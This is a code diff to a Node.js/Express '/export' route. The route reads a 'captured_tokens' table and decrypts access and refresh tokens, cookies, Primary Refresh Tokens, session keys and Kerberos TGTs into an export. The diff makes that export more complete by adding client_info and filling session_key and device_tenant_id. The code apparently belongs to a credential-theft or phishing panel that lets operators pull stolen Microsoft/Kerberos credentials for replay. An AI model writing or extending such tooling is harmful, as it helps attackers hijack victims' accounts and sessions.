@@ -1343,7 +1343,7 @@ router.post('/export', userAuth, async (req, res) => {
     const deleteAfter = req.body && req.body.delete_after === true;
 
     const [tokens] = await db.query(
-      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
+      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, client_info, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
 
@@ -1362,24 +1362,24 @@ router.post('/export', userAuth, async (req, res) => {
         refresh_token: safeDecrypt(token.refresh_token_encrypted),
         refresh_token_expires_in: 1209599,
         id_token: safeDecrypt(token.id_token_encrypted),
-        client_info: null,
+        client_info: token.client_info || null,
         session_key_jwe: safeDecrypt(token.session_key_jwe),
-        device_tenant_id: safeDecrypt(token.device_tenant_id),
+        device_tenant_id: token.device_tenant_id || null,
         tgt_ad: safeDecrypt(token.tgt_ad),
         tgt_cloud: safeDecrypt(token.tgt_cloud),
         kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
-        session_key: null,
+        session_key: safeDecrypt(token.session_key_jwe),
         tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
       };
 
-      // Try to extract client_info from session_key_jwe
-      if (prtData.session_key_jwe) {
+      // Fallback: try to extract client_info from session_key_jwe if DB column is empty
+      if (!prtData.client_info && prtData.session_key_jwe) {
         try {
           const parsed = JSON.parse(prtData.session_key_jwe);
           if (parsed.client_info) {
             prtData.client_info = parsed.client_info;
           }
-          if (parsed.session_key) {
+          if (parsed.session_key && !prtData.session_key) {
             prtData.session_key = parsed.session_key;
           }
         } catch (e) { /* ignore */ }
